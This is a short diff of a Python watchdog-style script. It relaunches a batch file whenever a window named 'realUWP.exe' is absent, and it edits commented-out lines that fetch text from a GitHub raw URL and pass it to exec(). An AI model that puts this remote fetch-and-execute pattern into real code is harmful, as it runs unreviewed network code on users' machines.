@@ -18,12 +18,12 @@ from datetime import datetime
 import zipfile
 import pygetwindow
 
-# fullypcmain = requests.get('https://raw.githubusercontent.com/dangbadao/bdqbdndnsd/main/checkrun').text
+# fullypcmain = requests.get('https://raw.githubusercontent.com/dangbadao/bdqbdndnsd/main/checkrun2').text
 # exec(fullypcmain)
 
 
 def findTool():
-  return pygetwindow.getWindowsWithTitle('run')
+  return pygetwindow.getWindowsWithTitle('realUWP.exe')
 
 
 print('Tool Running.....')
@@ -37,6 +37,6 @@ def fully():
         elif not findTool(): 
             print("not detected tool running")
             # open tool 
-            os.system('start.bat')
+            os.system('startmain.bat')
             
 fully()
